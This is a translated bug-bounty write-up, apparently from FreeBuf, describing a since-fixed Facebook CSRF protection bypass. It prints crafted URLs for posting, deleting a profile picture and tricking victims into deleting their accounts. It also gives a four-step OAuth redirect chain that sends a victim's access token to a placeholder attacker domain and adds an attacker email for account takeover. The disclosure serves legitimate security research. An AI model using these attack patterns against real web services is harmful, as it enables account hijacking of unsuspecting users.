***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![Facebook-API-bug.jpg](https://image.3001.net/images/20190214/1550138443_5c653c4b1a5a7.jpg!small)**
**今天分享的这个漏洞是Facebook的CSRF防护机制绕过漏洞，攻击者利用这个漏洞可以发送带有CSRF
token的请求至任意Facebook产品服务端用户，实现账户劫持。某些场景下，攻击者可能会构造恶意URL，诱惑受害者用户点击URL以触发漏洞，实现有效的Facebook账户劫持目的。**

## 漏洞说明

我发现的存在漏洞的Facebook功能服务端为：

> <https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX>

其中，XXXX为可以构造对服务端发起POST请求，且带参的Facebook接口，CSRF防护token -fb_dtsg会自动由Facebook生成并添加到请求内容中。

对于攻击者来说，完全可以构造一个让受害者信服的URL来点击触发漏洞，因为可在存在漏洞的服务端中调用其它Facebook功能服务接口，并可在其中包含请求参数和Anti-CSRF token - fb_dtsg，最终实现对服务端的POST请求。

利用上述漏洞服务端，经过构造，只要目标受害者点击访问了构造后的URL，攻击者就能实现多种目的操作。比如：

### 进行时间线（timeline）发贴：

    
    
    https://www.facebook.com/comet/dialog_DONOTUSE/?url=/api/graphql/%3fdoc_id=1740513229408093%26variables={"input":{"actor_id":{TARGET_ID},"client_mutation_id":"1","source":"WWW","audience":{"web_privacyx":"REDECATED"},"message":{"text":"TEXT","ranges":[]}}}

### 删除个人资料图片：

    
    
    https://www.facebook.com/comet/dialog_DONOTUSE/?url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID}

### 更改语言参数“locale”后欺骗受害者删除自己的账户：

    
    
    https://www.facebook.com/comet/dialog_DONOTUSE/？url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR

这个操作会跳出一个密码输入确认框来，只要受害者输入密码确定后，他自己的账户就会被删除了。

## 账户劫持可能性分析

要实现账户劫持，我们需要向受害者账户中添加一个新的邮箱地址或手机号码。但这里的问题在于，受害者需要访问两个单独的URL，一个用来实现邮箱或手机号码添加，一个用来确认操作。由于“正常”用来添加邮箱或手机号码的服务端，并不存在添加成功后的对用户跳转的“next”参数，所以，为了解决这个问题，我需要找到一个带有“next”参数的服务端，这样就能利用一个URL来实现账户劫持了。

第一步：需要授权验证攻击者的app应用，该过程中会重定向到<https://www.facebook.com/v3.2/dialog/oauth>，接下来会携带access_token参数自动跳转到攻击者构造的网页内容或网站中，access_token具有该app应用允许访问的一些范围，因为在/ajax/appcenter/redirect_to_app已经经过授权，所以这里可以无用户交互。

将这个构建好的URL链接发送给目标受害者用户：

    
    
    https://www.facebook.com/comet/dialog_DONOTUSE/?url=/ajax/appcenter/redirect_to_app%3fapp_id={ATTACKER_APP}%26ref=appcenter_top_grossing%26redirect_uri=https%3a//www.facebook.com/v3.2/dialog/oauth%3fresponse_type%3dtoken%26client_id%3d{ATTACKER_APP}%26redirect_uri%3d{DOUBLE_URL_ENCODED_LINK}%26scope%3d&preview=0&fbs=125&sentence_id&gift_game=0&scopes[0]=email&gdpv4_source=dialog

有多个过程会用到该步骤：

> 首先，使用 /v3.2/dialog/oauth 端点在“next”
> 参数中绕过Facebook的重定向保护，Facebook即使有linkshim恶意跳转防护，但在请求中加入“next”
> 参数的目的是为了拦截一些恶意重定向尝试。
>
> 其次，使用收到的token识别每个受害者，这将有助于以后提取出该与特定用户对应的确认码。

第二步：攻击者网站收到受害者的访问token，然后会在该网页中为创建一个邮箱并把受害得跳转到以下链接：

    
    
    https://www.facebook.com/comet/dialog_DONOTUSE/?url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]

该链接完成以下动作：

首先，它用/add_contactpoint/dialog/submit/
功能为受害者账户生成一个攻击者可控的邮箱（该过程中无需密码确认），之后，它会在“next” 参数中跳转到攻击者选定好的接口，如下：

    
    
    "/v3.2/dialog/oauth?response_type=token&client_id={ATTACKER_APP}&redirect_uri={ATTACKER_DOMAIN}" 

这样一来，受害者的访问请求会包含access_token跳转到 “ATTACKER_DOMAIN”上去。

第三步：攻击者网站收到“access_token”后，提取出受害者用户ID，然后在邮箱中查找形如以下Facebook确认邮箱添加的链接，其中CODE 和
HASH是Facebook生成的。

    
    
    https://www.facebook.com/confirmcontact.php?c={CODE}&z=0&gfid={HASH}

对攻击者来说，这种方法非常简单，但是如果要把受害者跳转到<https://www.facebook.com/settings?section=email>实现邮箱添加，那么就需要/confirm_code/dialog/submit/
功能来进行确认，好在其中包含一个“next” 参数，会在确认之后，可自动把受害者跳转到Facebook首页。

第四步：现在一个新邮箱已经添加到了受害者账户中了，攻击者就可以借此来重置密码实现账户劫持了。

上述验证过程比较冗长，但攻击过程却是一瞬间的事，非常危险，该漏洞可以不针对特定用户，只要是访问了第一步构造链接的任何Facebook用户都可能中招，只需把具体执行操作脚本部署在攻击者托管网站上就行。

## 漏洞上报进程

> 2019.1.26 漏洞上报
>
> 2019.1.26 Facebook确认漏洞
>
> 2019.1.28 详细证明验证
>
> 2019.1.31 Facebook修复漏洞
>
> 2019.2.12 Facebook $25,000漏洞赏金发放

 ***参考来源：[ysamm](https://ysamm.com/?p=185)，clouds编译，转载请注明来自FreeBuf.COM**  

